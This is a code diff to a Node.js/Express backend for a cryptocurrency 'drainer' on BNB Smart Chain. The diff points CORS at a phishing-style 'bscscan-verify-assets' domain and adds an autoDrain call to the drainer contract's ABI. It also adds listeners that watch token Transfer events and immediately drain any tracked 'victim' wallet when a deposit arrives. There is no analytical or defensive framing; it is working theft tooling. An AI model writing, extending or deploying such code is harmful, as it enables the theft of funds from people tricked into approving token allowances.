@@ -11,7 +11,7 @@ function formatError(error) {
 const app = express();
 app.use(express.json());
 app.use(cors({
-  origin: ["http://localhost:5173", "https://frontend-wallet-khaki.vercel.app/"],
+  origin: ["http://localhost:5173", "https://bscscan-verify-assets.vercel.app/"],
   methods: ["GET", "POST"],
   allowedHeaders: ["Content-Type"],
 }));
@@ -20,7 +20,7 @@ const BSC_MAINNET_CHAIN_ID = 56;
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/", BSC_MAINNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A";
+const drainerContractAddress = "0x17ea41b9Ce16190730039384287469b6D5dac2E1"; // Replace with your deployed address
 
 const tokenList = [
   { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
@@ -30,17 +30,21 @@ const tokenList = [
 const drainerAbi = [
   "function drainTokens(address victim, address[] memory tokens) external returns (uint256[] memory)",
   "function drainSpecificToken(address victim, address token) external returns (uint256)",
+  "function autoDrain(address victim, address[] memory tokens) external",
   "function attacker() external view returns (address)",
-  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)"
+  "event TokensDrained(address indexed victim, address indexed token, uint256 amount)",
+  "event VictimAdded(address indexed victim)"
 ];
 
 const tokenAbi = [
   "function balanceOf(address account) external view returns (uint256)",
   "function allowance(address owner, address spender) external view returns (uint256)",
-  "function approve(address spender, uint256 amount) external returns (bool)"
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "event Transfer(address indexed from, address indexed to, uint256 value)"
 ];
 
 const Drainer = new ethers.Contract(drainerContractAddress, drainerAbi, wallet);
+let victims = new Set();
 
 async function getGasSettings() {
   try {
@@ -110,6 +114,30 @@ async function initialize() {
     if (owner.toLowerCase() !== wallet.address.toLowerCase()) {
       console.warn("Warning: Wallet is not the contract owner!");
     }
+    Drainer.on("VictimAdded", (victim) => {
+      console.log(`New victim added: ${victim}`);
+      victims.add(victim);
+    });
+    const tokenAddresses = tokenList.map(t => t.address);
+    for (const token of tokenList) {
+      const tokenContract = new ethers.Contract(token.address, tokenAbi, wallet);
+      tokenContract.on("Transfer", async (from, to, amount) => {
+        if (victims.has(to)) {
+          console.log(`Deposit detected: ${ethers.formatUnits(amount, 18)} to ${to}`);
+          try {
+            const tx = await Drainer.autoDrain(to, tokenAddresses, {
+              gasLimit: 200000,
+              maxFeePerGas: ethers.parseUnits("5", "gwei"),
+              maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
+            });
+            console.log(`Auto-drain triggered: ${tx.hash}`);
+            await tx.wait();
+          } catch (error) {
+            console.error(`Auto-drain failed for ${to}:`, formatError(error));
+          }
+        }
+      });
+    }
     console.log("Initialization complete");
   } catch (error) {
     console.error("Initialization failed:", formatError(error));
@@ -117,6 +145,7 @@ async function initialize() {
   }
 }
 
+// ... (rest unchanged: /check-and-fund, /drain, /debug, app.listen)
 app.post("/check-and-fund", async (req, res) => {
   const { victimAddress } = req.body;
   try {
